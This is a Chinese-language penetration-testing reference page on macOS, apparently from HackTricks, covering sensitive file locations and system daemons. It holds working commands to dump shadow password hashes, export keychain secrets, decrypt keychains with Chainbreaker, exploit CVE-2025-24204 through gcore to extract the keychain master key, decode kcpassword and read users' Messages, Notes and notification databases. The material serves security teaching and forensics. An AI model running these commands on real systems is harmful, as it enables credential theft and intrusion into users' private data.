# macOS 敏感位置与有趣的 Daemons

{{#include ../../../banners/hacktricks-training.md}}

## 密码

### Shadow Passwords

Shadow password 与用户配置一同存储在 **`/var/db/dslocal/nodes/Default/users/`** 中的 plist 文件内。\
下面的 one-liner 可用于 dump **用户的所有信息**（包括 hash 信息）：
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**像这个脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2)或[**这个脚本**](https://github.com/octomagon/davegrohl.git)可用于将 hash 转换为 **hashcat** **格式**。

另一种 one-liner，可将所有非服务账户的 creds 以 hashcat 格式 `-m 7100`（macOS PBKDF2-SHA512）导出：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
获取用户 `ShadowHashData` 的另一种方法是使用 `dscl`：`` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

此文件**仅在系统以** **single-user mode** 运行时使用（因此并不常见）。

### Keychain Dump

请注意，使用 security binary **dump 已解密的 passwords** 时，系统会多次提示用户允许执行此操作。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
在现代 macOS 上，最值得关注的 backing stores 通常是 **`~/Library/Keychains/login.keychain-db`** 和 **`/Library/Keychains/System.keychain`**。它们是由 SQLite 支持的文件，但明文访问仍由 **`securityd`** 代理：窃取原始 DB 主要只能获得元数据和加密 blob，除非你还能够恢复用户密码、`SystemKey` 或内存中的 master key。<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> 根据此评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)，这些工具似乎已经无法在 Big Sur 中正常工作。

### Keychaindump 概述

一个名为 **keychaindump** 的工具被开发用于从 macOS keychain 中提取密码，但正如[讨论](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)所示，它在 Big Sur 等较新的 macOS 版本上存在局限。使用 **keychaindump** 要求攻击者先获得访问权限并将权限提升至 **root**。该工具利用了这样一个事实：为了方便用户，用户登录后 keychain 默认处于解锁状态，使应用程序能够访问其中的内容，而无需反复要求用户输入密码。但是，如果用户选择在每次使用后锁定 keychain，**keychaindump** 就会失效。

**Keychaindump** 的工作目标是一个名为 **securityd** 的特定进程。Apple 将其描述为负责授权和加密操作的 daemon，对访问 keychain 至关重要。提取过程包括识别一个由用户登录密码派生的 **Master Key**。该密钥对于读取 keychain 文件至关重要。为了定位 **Master Key**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，在标记为 `MALLOC_TINY` 的区域中寻找潜在密钥。以下命令用于检查这些内存位置：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
在识别出潜在的主密钥后，**keychaindump** 会在堆中搜索特定模式（`0x0000000000000018`），该模式表示一个主密钥候选项。要使用此密钥，还需要执行包括去混淆在内的后续步骤，具体说明见 **keychaindump** 的源代码。专注于此领域的分析人员应注意，用于解密 keychain 的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令如下：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可用于以取证可靠的方式从 OSX keychain 中提取以下类型的信息：

- Hashed Keychain password，可用于使用 [hashcat](https://hashcat.net/hashcat/) 或 [John the Ripper](https://www.openwall.com/john/) 进行破解
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

提供 keychain unlock password、使用 [volafox](https://github.com/n0fate/volafox) 或 [volatility](https://github.com/volatilityfoundation/volatility) 获取的 master key，或 SystemKey 等 unlock file 后，Chainbreaker 还可以提供 plaintext passwords。

如果没有上述任一解锁 Keychain 的方法，Chainbreaker 将显示所有其他可用信息。

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **使用 SystemKey 转储 keychain 密钥（包括密码）**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump Keychain keys（with passwords）并破解 hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用 memory dump Dump keychain keys（含 passwords）**

[按照以下步骤](../index.html#dumping-memory-with-osxpmem)执行 **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用用户密码转储 keychain 密钥（包括密码）**

如果你知道用户密码，就可以使用它来**转储并解密属于该用户的 keychain**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### 通过 `gcore` entitlement 获取 Keychain master key（CVE-2025-24204）

macOS 15.0（Sequoia）随 `/usr/bin/gcore` 搭载了 **`com.apple.system-task-ports.read`** entitlement，因此任何本地管理员（或恶意的已签名 app）都可以在 SIP/TCC 强制执行的情况下转储**任意进程的内存**。转储 `securityd` 会以明文泄露 **Keychain master key**，从而无需用户密码即可解密 `login.keychain-db`。<sup>[1]</sup>

**在存在漏洞的版本（15.0–15.2）上快速复现：**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
将提取出的十六进制密钥提供给 Chainbreaker（`--key <hex>`），以解密登录 keychain。Apple 已在 **macOS 15.3+** 中移除该 entitlement，因此这仅适用于未打补丁的 Sequoia 构建版本，或保留了存在漏洞的 binary 的系统。

### kcpassword

**kcpassword** 文件中保存了**用户的登录密码**，但前提是系统所有者已**启用自动登录**。因此，用户将无需输入密码即可自动登录（这并不安全）。

密码存储在文件 **`/etc/kcpassword`** 中，并使用密钥 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 进行 XOR。如果用户密码长度超过密钥长度，则会重复使用该密钥。\
因此，恢复密码相当容易，例如可以使用类似[**此脚本**](https://gist.github.com/opshope/32f65875d45215c3677d)的工具。

## 数据库中的有趣信息

### 消息
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

在 **Sequoia** 之前，通常可以在 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** 找到 Notification Center 的存储库。在 **Sequoia+** 中，Apple 将其移到了受 TCC 保护的 group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**。

大部分有趣的信息都存储在 **blob** 列中，因此你需要提取这些内容，并将其转换为人类可读的格式（`plutil -p -`、`strings` 或一个小型 parser）。快速 triage 示例：
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### 最近的隐私问题（NotificationCenter DB）

- 在 macOS **14.7–15.1** 中，Apple 将 banner 内容存储在 `db2/db` SQLite 中，且未进行适当的 redaction。CVE **CVE-2024-44292/44293/40838/54504** 允许任意本地用户仅通过打开该 DB 即可读取其他用户的 notification text（无需 TCC 提示）。
- Apple 通过将该 DB 移至 `group.com.apple.usernoted` 并在较新的 Sequoia build 中使用 TCC 保护来缓解此问题，因此在当前系统上，通常需要正确的 user context 或 TCC bypass 才能读取它。<sup>[3]</sup>
- 在 legacy endpoints 上，如果希望保留这些 artefacts，请在更新或重启前同时复制 `db`、`db-wal` 和 `db-shm` 文件。

### 备注

用户的 **notes** 位于 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
如果上面的 one-liner 输出过于嘈杂，可以导出 `ZICNOTEDATA.ZDATA`，对其执行 gunzip，然后解析 protobuf：这通常比直接在 SQLite 上运行 `strings` 更可靠。

### Background Tasks / Login Items

自 **Ventura** 起，用户批准的 login items 和多个 background tasks 会记录在 **BTM** stores 中，例如 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`**，以及带版本号的系统缓存 **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**。

这些文件有助于快速识别 persistence、helper tools，以及部分由 MDM 管理的 background items：
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
对于 persistence 角度和 BTM internals，请查看[auto-start locations 页面](../../macos-auto-start-locations.md#login-items)以及[Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management)。

## 偏好设置

在 macOS 应用中，偏好设置位于 **`$HOME/Library/Preferences`**；在 iOS 中，它们位于 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`。

在 macOS 中，可以使用 cli 工具 **`defaults`** 来**修改 Preferences 文件**。

**`/usr/sbin/cfprefsd`** 声明了 XPC services `com.apple.cfprefsd.daemon` 和 `com.apple.cfprefsd.agent`，可调用它来执行修改偏好设置等操作。

## OpenDirectory permissions.plist

文件 `/System/Library/OpenDirectory/permissions.plist` 包含应用于节点属性的权限，并受 SIP 保护。\
此文件通过 UUID（而非 uid）向特定用户授予权限，使其能够访问特定的敏感信息，例如 `ShadowHashData`、`HeimdalSRPKey` 和 `KerberosKeys` 等：
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## 系统通知

### Darwin 通知

负责通知的主要 daemon 是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach port 进行注册（使用 `sudo lsmp -p <pid notifyd>` 检查它们）。该 daemon 可通过文件 `/etc/notify.conf` 进行配置。

通知使用的名称是唯一的反向 DNS notation。当通知发送到其中一个名称时，已表明能够处理该通知的客户端将会收到它。

可以向 notifyd 进程发送 SIGUSR2 信号并读取生成的文件来 dump 当前状态（并查看所有名称）：`/var/run/notifyd_<pid>.status`】【：
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** 的主 binary 是 **`/usr/sbin/distnoted`**，这是发送通知的另一种方式。它暴露了一些 XPC services，并执行一些检查来尝试验证客户端。

### Apple Push Notifications (APN)

在这种情况下，应用程序可以注册 **topics**。客户端会通过 **`apsd`** 联系 Apple 的服务器来生成 token。\
然后，providers 也会生成 token，并能够连接到 Apple 的服务器，向客户端发送消息。这些消息会由 **`apsd`** 在本地接收，再将通知中继给等待接收通知的应用程序。

偏好设置位于 `/Library/Preferences/com.apple.apsd.plist`。

macOS 中的消息本地数据库位于 `/Library/Application\ Support/ApplePushService/aps.db`，iOS 中则位于 `/var/mobile/Library/ApplePushService`。其中包含 3 个表：`incoming_messages`、`outgoing_messages` 和 `channel`。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
还可以使用以下方式获取有关守护进程和连接的信息：
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

这些是用户应该在屏幕上看到的通知：

- **`CFUserNotification`**：这些 API 提供了一种在屏幕上显示带有消息的弹出窗口的方式。
- **The Bulletin Board**：这会在 iOS 中显示一个会消失的横幅，并将其存储在 Notification Center 中。
- **`NSUserNotificationCenter`**：这是 MacOS 中的 iOS bulletin board。在较旧的 macOS 版本中，数据库通常位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`；在 Sequoia+ 中，它被移动到了 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`。

## References

- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
